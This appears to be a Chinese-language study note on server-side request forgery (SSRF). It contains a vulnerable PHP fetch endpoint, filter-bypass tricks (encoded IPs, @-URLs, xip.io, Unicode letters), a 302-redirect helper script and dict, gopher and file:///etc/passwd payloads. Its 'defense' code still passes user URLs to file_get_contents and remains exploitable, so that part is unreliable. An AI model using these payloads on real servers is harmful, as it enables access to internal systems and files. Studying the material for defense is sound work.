## SSRF 漏洞学习 ##
+ 漏洞介绍
+ 漏洞原理
+ 利用方式
+ 防御方式
+ 绕过一些不完整的防御

### 介绍 ###
SSRF(Server-Side-Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务器端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统 （正因为请求是由服务端发起的，所以服务端能请求到与自身相连与外网隔绝的内部系统）

### 原理 ##
SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能并且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址图片等，利用的服务端请求伪造。SSRF利用存在缺陷的web应用作为代理攻击远程和本地的服务器

主要攻击方式如下：
+ 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息
+ 攻击运行在内网或本地的应用程序
+ 对内网web应用进行指纹识别，识别企业内部的资产信息
+ 攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击(比如：struts2、SQli等)
+ 利用file协议读取本地文件

### 利用 ###
漏洞代码：
```php
<?php
function curl($url){
	$ch=curl_init(); /*初始化curl插件*/
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_HEADER,0);
	curl_exec($ch);
	curl_close($ch);
}

if (isset($_GET['url'])){
	$u=$_GET['url'];
	curl($u);
}
?>
```

修改url为别的地址：
![](https://s2.ax1x.com/2019/05/25/VFxWvD.png)

修改url为内网地址：
![](https://s2.ax1x.com/2019/05/25/VFzF2T.png)

修改url为本地文件地址：
![](https://s2.ax1x.com/2019/05/25/VFzQG6.png)

获取端口banner：
![](https://s2.ax1x.com/2019/05/25/VFztZd.png)

### 防御 ###
正确的实现远程加载图片等功能，而不是使用curl_exec：
```php
<?php
if (isset($_GET['url'])) { 
    $content = file_get_contents($_GET['url']); 
    $filename ='I:\\phpstudy\\WWW\\img\\'.rand().'.jpg';  /*rand()随机数*/
	$qg=explode('\\',$filename);
    file_put_contents($filename, $content); 
    echo $_GET['url']; 
    $img = "<img src='img/$qg[4]'>"; 
}
echo $img;
?>
```
![](https://s2.ax1x.com/2019/05/25/VkPqGn.md.png)

### Bypass ###
现实中常见的防御：
+ 服务器开启 OpenSSL 无法进行交互利用
+ 服务端需要鉴权（Cookies & User：Pass）不能完美利用
+ 限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。
禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:///,gopher://,ftp:// 等引起的问题。
+ 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。


绕过方式：
```
更改 IP 地址写法 例如192.168.0.1

8 进制格式：0300.0250.0.1
16 进制格式：0xC0.0xA8.0.1
10 进制整数格式：3232235521
16 进制整数格式：0xC0A80001
还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1
利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如：

http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容
可以指向任意 ip 的域名xip.io：http://127.0.0.1.xip.io/==>http://127.0.0.1/
短地址http://dwz.cn/11SMa==>http://127.0.0.1
利用句号。：127。0。0。1==>127.0.0.1
利用 Enclosed alphanumerics

ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
绕过http协议的限制：
构造一个前端页面

```html
<html>
<body>
  <form name="px" method="post" action="http://127.0.0.1/ss.php">
    <input type="text" name="url" value="">
    <input type="submit" name="commit" value="submit">
  </form>
  <script></script>
</body>
</html>
```
请求非 HTTP 的端口可以返回 banner 信息。

或可利用 302 跳转绕过 HTTP 协议的限制。


辅助脚本

```php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>
```

协议利用 
Dict 协议
```
dict://fuzz.wuyun.org:8080/helo:dict
```
Gopher 协议

```
gopher://fuzz.wuyun.org:8080/gopher
```
File 协议

```
file:///etc/passwd
```

## 参考文章 ##
利用 Gopher 协议拓展攻击面 ：[利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
Ctf-Wiki SSRF：[CTF-Wiki](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/)
腾讯某处SSRF漏洞：[腾讯某处SSRF漏洞](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)